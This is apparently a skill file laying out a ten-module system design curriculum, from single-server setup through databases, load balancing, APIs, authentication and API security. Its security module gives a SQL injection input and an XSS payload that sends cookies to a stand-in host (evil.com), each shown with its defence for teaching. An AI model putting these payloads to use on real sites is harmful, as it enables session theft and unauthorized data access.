---
name: approach-3-comprehensive
description: Approach 3: Comprehensive System Design Curriculum. Complete 10-module curriculum covering foundations, databases, scaling, load balancing, reliability, API design, protocols, authentication, authorization, and security. Best for learning system design for interviews and career growth.
version: 1.0.0
---

# Approach 3: Comprehensive System Design Curriculum

## Overview
A complete educational curriculum covering the full spectrum of system design from single server foundations to production-ready distributed systems. Master system design step by step.

## Learning Path (10 Modules)

### Module 1: Foundations
**Single Server Setup + Request Flow**

```
USERS (Browser/Mobile)
        │
        ▼
      DNS (Domain → IP)
        │
        ▼
┌─────────────────────────────┐
│      SINGLE SERVER          │
│  ┌─────────────────────┐    │
│  │ • Web Application    │    │
│  │ • API Endpoints      │    │
│  │ • Database           │    │
│  │ • Cache              │    │
│  └─────────────────────┘    │
└─────────────────────────────┘
```

**Request Flow:**
1. User enters domain name
2. Browser contacts DNS
3. DNS returns IP address
4. Client sends HTTP request
5. Server processes request
6. Server returns response (HTML page or JSON)

**Client Types:**
- **Web Clients**: Business logic + data storage + presentation (HTML/CSS/JS)
- **Mobile Clients**: API calls + JSON responses + stateful UI + offline capable

**API Response Example:**
```json
GET /api/products/123
{
  "id": "123",
  "name": "Product Name",
  "description": "...",
  "price": 29.99,
  "metadata": {...}
}
```

**Key Takeaways:**
- ✓ Start small - single server is the foundation
- ✓ Understand request flow before adding complexity
- ✓ Web and mobile clients have different needs
- ✓ APIs are contracts between client and server

### Module 2: Database Selection
**Two main families - Choose based on your data:**

**RELATIONAL (SQL)**:
- Structured data, tables with rows/cols
- SQL for queries
- ACID transactions
- Examples: PostgreSQL, MySQL, Oracle, SQLite

**NON-RELATIONAL (NoSQL)**:
- Flexible schemas, JSON documents
- BASE (eventual consistency)
- Examples: MongoDB, Cassandra, Redis, Neo4j

**SQL Advantages:**
1. **Complex Join Operations** - Combine tables (customers × orders × products)
2. **ACID Transactions** - Atomic, Consistent, Isolated, Durable
   - Example: Bank transfer (both debit and credit succeed or both fail)

**NoSQL Types:**
| Type | Example | Best For |
|------|---------|----------|
| Document | MongoDB | Complex nested data |
| Wide Column | Cassandra | Massive write scale |
| Key-Value | Redis | Caching, fast lookups |
| Graph | Neo4j | Relationships, recommendations |

**SQL vs NoSQL Decision Tree:**
```
Is data well-structured with clear relationships?
    ├── YES → Need ACID transactions?
    │         ├── YES → SQL (PostgreSQL, MySQL)
    │         └── NO → Consider NoSQL
    └── NO → Is data unstructured/semi-structured?
              ├── YES → NoSQL (MongoDB, Cassandra)
              └── NO → Assess:
                      • Low latency critical? → NoSQL
                      • Massive scale? → NoSQL
                      • Complex queries/joins? → SQL
                      • Financial/payment data? → SQL
```

### Module 3: Scaling Strategies
**Two fundamental approaches:**

**VERTICAL SCALING (Scale Up):**
- Add more resources to one server (CPU, RAM, disk)
- Simple, no architecture change
- Works for low/moderate traffic
- Limitations: Hard cap, single point of failure

**HORIZONTAL SCALING (Scale Out):**
- Add more servers to share the load
- Better fault tolerance, better scalability
- More complex, needs load balancer
- Use for: Large scale applications

**Recommendation:** Scale vertical until cost/benefit doesn't make sense, then switch to horizontal.

### Module 4: Load Balancing
**7 Common Algorithms:**

1. **Round Robin** - Sequential rotation, similar servers
2. **Least Connections** - Route to least busy server
3. **Least Response Time** - Route to fastest + least busy
4. **IP Hash** - Same client always to same server (session affinity)
5. **Weighted** - Based on server capacity
6. **Geographic** - Route to nearest server (latency reduction)
7. **Consistent Hashing** - Hash ring, consistent client routing

**Health Checks:**
```
ONLINE: ✓ Server 1    ✓ Server 2    ✗ Server 3
Traffic routed to: Server 1 & Server 2 only
```

**Load Balancer Implementations:**
- **Software**: Nginx, HAProxy
- **Hardware**: F5, Citrix, A10
- **Cloud**: AWS ALB, Azure LB, GCP LB (with auto-scaling)

### Module 5: Eliminating Single Points of Failure
**A Single Point of Failure (SPoF) brings down the entire system.**

**Common SPoFs:** Load Balancer, API Server, Database, Cache

**Strategies to Eliminate:**
1. **Redundancy:** Multiple instances (primary + standby)
2. **Health Checks:** Monitor all components continuously
3. **Self-Healing:** Auto-replace failed instances

**Database Redundancy (Primary-Replica):**
```
Primary DB ◄───── WRITE
        │ replicates
        ▼
┌────────────────────────────────────┐
│  Replicas (READ)                   │
│  Rep 1  Rep 2  Rep 3  Rep 4  Rep 5  │
└────────────────────────────────────┘
If Primary fails → One Replica is promoted
```

### Module 6: API Design
**Three Main Styles:**

**REST API:**
- Multiple endpoints (/products, /products/{id})
- HTTP methods (GET, POST, PUT, PATCH, DELETE)
- Cache-friendly, stateless
- Best for: General purpose

**GraphQL API:**
- Single endpoint (/graphql)
- Query language for exact data needed
- App-level caching
- Best for: Complex UIs

**gRPC:**
- Multiple endpoints
- Binary (Protocol Buffers)
- Streaming, bidirectional
- Best for: Microservices, internal communication

**REST API Design:**
- **Resource Modeling**: Nouns, not verbs (/products, not /getProducts)
- **CRUD Operations**:
  - CREATE: `POST /products`
  - READ: `GET /products`, `GET /products/{id}`
  - UPDATE: `PUT /products/{id}` (replace), `PATCH /products/{id}` (partial)
  - DELETE: `DELETE /products/{id}`
- **Filtering, Sorting, Pagination**:
  - `GET /products?category=electronics&in_stock=true`
  - `GET /products?sort=price:asc,rating:desc`
  - `GET /products?page=3&limit=20`
- **Status Codes**:
  - 200 OK, 201 Created, 204 No Content
  - 301 Moved Permanently
  - 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found
  - 500 Server Error

**GraphQL API Design:**
- **Schema Definition:**
  ```graphql
  type User {
    id: ID!
    name: String!
    email: String!
    posts: [Post!]
  }

  type Query {
    user(id: ID!): User
    users: [User!]
  }

  type Mutation {
    createUser(name: String!, email: String!): User
  }
  ```
- **Query Example:**
  ```graphql
  query GetUserWithPosts {
    user(id: "123") {
      name
      posts {
        title
      }
    }
  }
  ```

**API Design Principles:**
- ✓ Consistent naming (kebab-case or camelCase, not both)
- ✓ Proper HTTP methods
- ✓ Appropriate status codes
- ✓ Support filtering, sorting, pagination
- ✓ Version your APIs (/api/v1/products)
- ✓ Make it predictable, consistent, simple, secure, performant

### Module 7: Protocols & Transport
**Application Layer Protocols:**

**HTTP/HTTPS:**
- Foundation of web APIs
- Request format: Method, Resource URL, HTTP version, Host, Authorization
- Response format: HTTP version, Status code, Content-Type, Body
- HTTPS = HTTP + TLS/SSL encryption

**WebSocket:**
- Real-time bidirectional communication
- Solves HTTP polling problems (latency, bandwidth waste)
- Use for: Chat, real-time updates, gaming, collaboration

**TCP vs UDP:**
- **TCP**: Reliable, ordered, error-checked, connection-based (3-way handshake)
  - Use for: Web APIs, databases, email, file transfer
- **UDP**: Fast, lightweight, no delivery guarantee, connectionless
  - Use for: Video streaming, voice calls, gaming, live streams

**Default:** TCP unless you have a specific reason for UDP.

### Module 8: Authentication
**Answers: "Who ARE you?"**

**Methods:**
- **Basic Auth**: username:password (Base64 encoded) - Internal tools only
- **Bearer Token**: Send token with each request - Most APIs
- **OAuth2 + JWT**: Login via provider, get signed token - Third-party login
- **Access + Refresh Tokens**: Short-lived access + long-lived refresh - Modern apps
- **SSO**: One login, many apps - Enterprise systems

**OAuth2 + JWT Flow:**
```
USER → YOUR APP → PROVIDER (Google)
 1. Login
 2. Redirect to provider
 3. User authenticates
 4. Auth code returned
 5. Exchange code for JWT token
 6. JWT + User data returned
 7. Include JWT in all API requests
```

**Access + Refresh Token Pattern:**
```
CLIENT                        SERVER
 1. Login + Password ─────────────────────────────►
  ◄────────────────── Access Token
  ◄────────────────── Refresh Token

2. API Request + Access Token ───────────────────►
  ◄────────────────── Data

3. Access Token Expired!
 4. Refresh Token ───────────────────────────────►
  ◄────────────────── New Access Token
```

### Module 9: Authorization
**Answers: "What can you DO?"**

**Three Models:**

**1. RBAC (Role-Based Access Control):**
```
ADMIN              EDITOR              VIEWER
┌───────────────┐  ┌───────────────┐  ┌───────────────┐
│ Create        │  │ Create        │  │ Read only     │
│ Read          │  │ Read          │  │               │
│ Update        │  │ Update        │  │               │
│ Delete        │  │               │  │               │
│ Manage users  │  │               │  │               │
└───────────────┘  └───────────────┘  └───────────────┘
```

**2. ABAC (Attribute-Based Access Control):**
```
IF user.department = "HR"
AND resource.classification = "internal"
AND time_of_day IN business_hours
THEN allow READ
```

**3. ACL (Access Control List):**
```
DOCUMENT: "Q1 Report.docx"
User    │ Permissions
Alice   │ READ, WRITE
Bob     │ READ
Charlie │ NONE
```

**Enforcing Authorization:**
- **OAuth2** for delegated access (give token, not password)
- **JWT-based** authorization (token contains user_id, roles, scopes)
  - Apply permission logic based on roles/scopes

### Module 10: API Security
**7 Proven Techniques:**

**1. Rate Limiting:**
- Per-Endpoint: `POST /comments` → 100 requests/minute/user
- Per-User/IP: Each user gets 100 req/min
- Global (DDoS): All traffic combined → Max 10,000 req/min

**2. CORS (Cross-Origin Resource Sharing):**
```
Allowed Origins: https://app.example.com
Attacker Site: https://evil.com ❌ BLOCKED

Response Headers:
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
```

**3. Input Validation (Prevent Injection):**
```
❌ BAD: "SELECT * FROM users WHERE name = '" + input + "'"
Input: "admin' OR '1'='1" → Returns all users!

✓ GOOD: Parameterized query
"SELECT * FROM users WHERE name = $1"
query(name=user_input)
```

**4. Firewall:**
```
INCOMING TRAFFIC
        │
        ▼
   ┌─────────────┐
   │   FIREWALL   │
   │ Blocks:     │
   │ • SQL keywords│
   │ • Strange HTTP│
   │ • Known attack│
   └──────┬────────┘
          │
          ▼
    CLEAN TRAFFIC
          │
          ▼
   ┌─────────────┐
   │   YOUR API   │
   └─────────────┘
```

**5. VPN (Virtual Private Network):**
```
Public Internet          VPN Network
┌─────────────┐       ┌─────────────────────┐
│ Public API  │       │ Internal Admin API  │
└─────────────┘       └─────────────────────┘
     ▲                         ▲
     │                         │
 Any user              Employee only
```

**6. CSRF (Cross-Site Request Forgery):**
```
User logged into bank.com
Evil site tries: POST bank.com/transfer (hidden request)

PROTECTION: CSRF Token
- Server generates random token
- Token embedded in form
- Request includes token
- Server verifies token matches
- Evil site doesn't have token → Request blocked
```

**7. XSS (Cross-Site Scripting):**
```
Attacker posts comment:
"<script>fetch('https://evil.com?cookie='+document.cookie)</script>"

PROTECTION:
• Sanitize input (remove HTML tags)
• Output encoding (escape HTML chars)
• Content-Security-Policy header
• HTTPOnly cookies (JS can't read)
```

## Learning Checklist

- ☐ **FOUNDATIONS**: Single server, DNS, request flow, API basics
- ☐ **DATABASES**: SQL vs NoSQL, ACID, joins
- ☐ **SCALING**: Vertical vs horizontal, load balancing basics
- ☐ **LOAD BALANCING**: 7 algorithms, health checks, implementations
- ☐ **RELIABILITY**: SPoFs, redundancy, self-healing
- ☐ **API DESIGN**: REST, GraphQL, gRPC, design principles
- ☐ **PROTOCOLS**: HTTP, WebSockets, TCP vs UDP
- ☐ **AUTHENTICATION**: Basic, Bearer, OAuth2, JWT, SSO
- ☐ **AUTHORIZATION**: RBAC, ABAC, ACL, OAuth2 scopes
- ☐ **SECURITY**: Rate limiting, CORS, input validation, firewall, VPN, CSRF, XSS

## Use This Approach For
- Learning system design from foundations
- Interview preparation
- Career growth to senior roles
- Complete understanding of all concepts

## See Also
- `tech-stack`: For choosing the right technologies
- `approach-1-planned`: For designing specific systems
- `approach-2-evolutionary`: For starting simple and evolving
